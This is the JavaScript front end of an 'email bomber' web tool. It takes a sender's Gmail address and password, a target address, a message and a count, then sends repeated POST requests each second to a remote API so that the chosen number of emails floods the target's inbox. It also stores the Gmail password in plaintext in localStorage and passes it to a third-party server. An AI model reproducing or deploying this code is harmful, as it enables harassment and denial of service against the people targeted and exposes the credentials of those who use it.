/*
* Author: Fazle Rabbi
* Date: 4 Feb, 2023
*/

const startBtn = document.querySelector(".start-btn");
// form already declare in app.js
const name_input = document.querySelector(".name");
const gmail_input = document.querySelector(".gmail");
const password_input = document.querySelector(".password");
const target_input = document.querySelector(".target");
const subject_input = document.querySelector(".subject");
const message_input = document.querySelector(".message");
const amount_input = document.querySelector(".amount");
const display = document.querySelector("#display");
const modalContainer = document.querySelector(".modal-container");
const emailCount = document.querySelector(".email-count");
const stopBtn = document.querySelector(".stop-btn");
const loading = document.querySelector(".loading");
const emailStatus = document.querySelector(".email-status");
const bombingStatus = document.querySelector(".bombing-status");
const totalEmailNumber = document.querySelector(".total-email-number");
const modalBoxTitle = document.querySelector(".modal-box-title");

// Get form data from localStorage for autocomplete form
form_data = JSON.parse(localStorage.getItem("form_data"));

// Auto complete form when user open the webpage
if(form_data != null){
	name_input.value = form_data.name;
	gmail_input.value = form_data.gmail;
	password_input.value = form_data.password;
	target_input.value = form_data.target;
	subject_input.value = form_data.subject;
	message_input.value = form_data.message;
	amount_input.value = form_data.amount;
}

form.addEventListener("submit", function(e){
	e.preventDefault();
	name = name_input.value;
	gmail = gmail_input.value;
	password = password_input.value;
	target = target_input.value;
	subject = subject_input.value;
	message = message_input.value;
	amount = amount_input.value;
	
	data = JSON.stringify({
			name,gmail,password,
			target,subject,message,
			amount
	});
	localStorage.setItem("form_data",data);
	
	modalBoxTitle.innerHTML = "Bombing Started"
	modalContainer.style.opacity = 1;
	modalContainer.style.pointerEvents = "auto";
	totalEmailNumber.innerHTML = amount;
	start_interval(
		name,gmail,password,target,subject,message,amount
		);
	
});


// Start Interval
const tick_image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwx9siYYMEpz0z8VAkYJiCv5MYh7ZEw_UQkQ&usqp=CAU";
const loader_image = "https://i.pinimg.com/originals/1f/2d/f8/1f2df8fad7e9bfcb18d9d553f8fc259b.gif";
let interval = null;
function start_interval(name,gmail,password,target,subject,message,amount){
	let i = 0;
	interval = setInterval(function() {
		i++;
		if(i == amount_input.value){
			// alert("finish")
			// Bombing Complete Here
			clearInterval(interval);
			bombingStatus.innerHTML = "Completed";
			// return;
			// bombingStatus.innerHTML = "Completed";
			// emailStatus.innerHTML = "All email sent successful";
			// loading.setAttribute("src",tick_image);
			// loading.setAttribute("alt","Finish...");
		}
		// else{
			// Bombing Started Here
			bombingStatus.innerHTML = "Started";
			// emailStatus.innerHTML = `${i} Email sent successful`;
			loading.setAttribute("src",loader_image);
			loading.setAttribute("alt","Loading...");
			emailStatus.style.display = "block";
			send_email(name,gmail,password,target,subject,message,amount);
		// }
	}, 1000);
}


let i = 0;
let isBombingStopped = null;


// Stop bombing by clicking on Stop-Bombing Button
stopBtn.addEventListener("click", ()=>{
	toast = document.querySelector(".toast");
	toast.style.opacity = 1;
	setTimeout(function() {
		toast.style.opacity = 0;
	}, 2000);
	clearInterval(interval);
	modalContainer.style.opacity = 0;
	modalContainer.style.pointerEvents = "none";
	interval = null;
	i = 0;
	setTimeout(function() {
		bombingStatus.innerHTML = "Started";
		emailStatus.innerHTML = "";
		loading.setAttribute("src",loader_image);
		loading.setAttribute("alt","Loading...");
		emailStatus.style.display = "none";
	}, 1000);
});


// Send Email Function
const url = "https://fr-api.up.railway.app/api/gmail/send-mail";
// const url = "http://127.0.0.1:5000/api/gmail/send-mail";
// let i = 0;
// let isBombingStopped = null;
function send_email(name,gmail,password,target,subject,message,amount){
	fetch(url, {
	  method: 'POST',
	  body: JSON.stringify({
	    name,
	    gmail,
	    password,
	    target,
	    subject,
	    message
	  }),
	  headers: {
	    'Content-type': 'application/json; charset=UTF-8',
	  },
	})
	  .then((response) => response.json())
	  .then((json) => {
			i++;
			if(i == amount){
			   // Bombing Complete Here
				//clearInterval(interval);
				// bombingStatus.innerHTML = "Completed";
				modalBoxTitle.innerHTML = "Bombing Completed"
				emailStatus.innerHTML = "All email sent successful";
				loading.setAttribute("src",tick_image);
				loading.setAttribute("alt","Finish...");
				i = 0;
				// alert(bombingStatus.innerHTML)
				return;
			}
			// When email successfuly sent
			if(json.message.includes("succussful")){
				modalBoxTitle.innerHTML = "Bombing Started"
				emailStatus.innerHTML = `${i} Email sent successful`;
				loading.setAttribute("src",loader_image);
			}
			// when email not sent due to invalid credential
			if(json.message.includes("wrong")){
				// alert(json.message)
				modalBoxTitle.innerHTML = "Wrong Credentials"
				error_image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSd6zi69_FOH662jtvyqhAj9SZXrKMqm0KOhg&usqp=CAU"
				loading.setAttribute("src",error_image);
				// stop bombing so that, not complete the bombing
				isBombingStopped = true;
				clearInterval(interval);
				emailStatus.innerHTML = "Oops!You have entered wrong credentials.Please provide current credentials."
				i = 0;
			}
	  })
	  // No Internet Error
	  .catch((err)=>{
	     	// alert("ERROR: "+err);
	     	modalBoxTitle.innerHTML = "No Internet"
	     	error_image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSd6zi69_FOH662jtvyqhAj9SZXrKMqm0KOhg&usqp=CAU"
	     	loading.setAttribute("src",error_image);
	     	// stop bombing so that, not complete the bombing
	     	isBombingStopped = true;
	     	clearInterval(interval);
	     	emailStatus.innerHTML = "Oops!Looks like you have no internet.Please check your internet connection and try again."
	     	i = 0;
	  });	
	
}
